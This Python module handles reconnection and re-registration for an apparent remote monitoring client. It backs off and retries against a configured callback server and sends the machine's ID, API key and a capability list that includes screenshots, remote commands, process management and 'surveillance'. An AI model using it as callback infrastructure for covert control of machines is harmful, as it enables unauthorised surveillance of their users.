"""
Enhanced Connection Stability Module
Provides robust reconnection logic for network drops and connection issues
"""
import time
import threading
import requests
import socket
from datetime import datetime, timedelta
import json
import logging

class ConnectionStabilityManager:
    """Manages connection stability with enhanced reconnection logic"""
    
    def __init__(self, callback_config, max_retries=10, base_delay=5):
        self.callback_config = callback_config
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.current_retries = 0
        self.last_successful_connection = None
        self.connection_failures = []
        self.is_monitoring = False
        self.monitor_thread = None
        
        # Connection health metrics
        self.total_attempts = 0
        self.successful_connections = 0
        self.network_timeouts = 0
        self.connection_refused = 0
        
        # Adaptive retry parameters
        self.adaptive_delay = base_delay
        self.max_delay = 300  # 5 minutes max
        
        # Setup logging
        self.logger = logging.getLogger('ConnectionStability')
        
    def start_monitoring(self):
        """Start connection monitoring in background"""
        if not self.is_monitoring:
            self.is_monitoring = True
            self.monitor_thread = threading.Thread(target=self._monitor_connection, daemon=True)
            self.monitor_thread.start()
            self.logger.info("Connection monitoring started")
    
    def stop_monitoring(self):
        """Stop connection monitoring"""
        self.is_monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        self.logger.info("Connection monitoring stopped")
    
    def _monitor_connection(self):
        """Monitor connection health continuously"""
        while self.is_monitoring:
            try:
                if self._test_connection():
                    self._handle_successful_connection()
                else:
                    self._handle_failed_connection()
                    
                # Adaptive sleep based on connection health
                sleep_time = min(self.adaptive_delay, 60)  # Max 1 minute between checks
                time.sleep(sleep_time)
                
            except Exception as e:
                self.logger.error(f"Connection monitoring error: {e}")
                time.sleep(30)  # Wait 30s on monitor errors
    
    def _test_connection(self):
        """Test if connection to callback server is available"""
        try:
            # Quick connectivity test
            callback_url = self.callback_config.get('callback_url', '')
            if not callback_url:
                return False
            
            # Extract host and port
            if '://' in callback_url:
                host_part = callback_url.split('://')[1]
            else:
                host_part = callback_url
                
            if ':' in host_part:
                host, port_str = host_part.split(':', 1)
                port = int(port_str.split('/')[0])  # Remove any path
            else:
                host = host_part.split('/')[0]
                port = 80
            
            # Socket test (faster than HTTP)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            result = sock.connect_ex((host, port))
            sock.close()
            
            self.total_attempts += 1
            return result == 0
            
        except Exception as e:
            self.logger.debug(f"Connection test failed: {e}")
            self.total_attempts += 1
            return False
    
    def _handle_successful_connection(self):
        """Handle successful connection"""
        if self.current_retries > 0:
            self.logger.info(f"Connection restored after {self.current_retries} retries")
        
        self.current_retries = 0
        self.adaptive_delay = self.base_delay
        self.last_successful_connection = datetime.now()
        self.successful_connections += 1
        
        # Clear old failure records (keep last 10)
        if len(self.connection_failures) > 10:
            self.connection_failures = self.connection_failures[-10:]
    
    def _handle_failed_connection(self):
        """Handle failed connection with exponential backoff"""
        self.current_retries += 1
        failure_time = datetime.now()
        
        self.connection_failures.append({
            'time': failure_time,
            'retry_count': self.current_retries
        })
        
        # Exponential backoff with jitter
        self.adaptive_delay = min(
            self.base_delay * (2 ** min(self.current_retries, 8)),
            self.max_delay
        )
        
        # Add jitter to prevent thundering herd
        import random
        jitter = random.uniform(0.5, 1.5)
        self.adaptive_delay *= jitter
        
        self.logger.warning(
            f"Connection failed (attempt {self.current_retries}), "
            f"next retry in {self.adaptive_delay:.1f}s"
        )
    
    def attempt_reconnection(self, force=False):
        """Attempt to reconnect with enhanced logic"""
        if not force and self.current_retries >= self.max_retries:
            self.logger.error("Max retries exceeded, giving up")
            return False
        
        try:
            # Test basic connectivity first
            if not self._test_connection():
                return False
            
            # Try actual callback registration
            return self._attempt_callback_registration()
            
        except Exception as e:
            self.logger.error(f"Reconnection attempt failed: {e}")
            return False
    
    def _attempt_callback_registration(self):
        """Attempt to register with callback server"""
        try:
            from server_modules.config import config, pc_id
            
            registration_data = {
                'type': 'register',
                'pc_id': pc_id,
                'pc_name': config.get('pc_name', 'Unknown'),
                'server_url': f"http://localhost:{config.get('port', 5000)}",
                'api_key': config.get('api_key'),
                'capabilities': self._get_capabilities(),
                'reconnection': True,
                'retry_count': self.current_retries
            }
            
            headers = {
                'Content-Type': 'application/json',
                'X-Callback-Key': self.callback_config.get('callback_key', ''),
                'User-Agent': 'MonitorClient/3.0'
            }
            
            response = requests.post(
                f"{self.callback_config['callback_url']}/register",
                json=registration_data,
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                self.logger.info("Successfully re-registered with callback server")
                return True
            else:
                self.logger.warning(f"Registration failed: {response.status_code}")
                return False
                
        except requests.exceptions.Timeout:
            self.network_timeouts += 1
            self.logger.warning("Registration timeout")
            return False
        except requests.exceptions.ConnectionError:
            self.connection_refused += 1
            self.logger.warning("Connection refused")
            return False
        except Exception as e:
            self.logger.error(f"Registration error: {e}")
            return False
    
    def _get_capabilities(self):
        """Get current system capabilities"""
        return {
            'screenshots': True,
            'file_transfer': True,
            'remote_commands': True,
            'system_info': True,
            'process_management': True,
            'surveillance': True
        }
    
    def get_connection_stats(self):
        """Get connection statistics"""
        uptime = None
        if self.last_successful_connection:
            uptime = (datetime.now() - self.last_successful_connection).total_seconds()
        
        return {
            'total_attempts': self.total_attempts,
            'successful_connections': self.successful_connections,
            'current_retries': self.current_retries,
            'network_timeouts': self.network_timeouts,
            'connection_refused': self.connection_refused,
            'last_successful': self.last_successful_connection.isoformat() if self.last_successful_connection else None,
            'uptime_seconds': uptime,
            'adaptive_delay': self.adaptive_delay,
            'connection_health': self._calculate_health_score()
        }
    
    def _calculate_health_score(self):
        """Calculate connection health score (0-100)"""
        if self.total_attempts == 0:
            return 100
        
        success_rate = (self.successful_connections / self.total_attempts) * 100
        
        # Penalize for current failures
        if self.current_retries > 0:
            penalty = min(self.current_retries * 10, 50)
            success_rate -= penalty
        
        return max(0, min(100, success_rate))
    
    def reset_stats(self):
        """Reset connection statistics"""
        self.total_attempts = 0
        self.successful_connections = 0
        self.network_timeouts = 0
        self.connection_refused = 0
        self.connection_failures = []
        self.current_retries = 0
        self.logger.info("Connection statistics reset")


def setup_connection_stability(callback_config):
    """Setup connection stability monitoring"""
    stability_manager = ConnectionStabilityManager(callback_config)
    stability_manager.start_monitoring()
    return stability_manager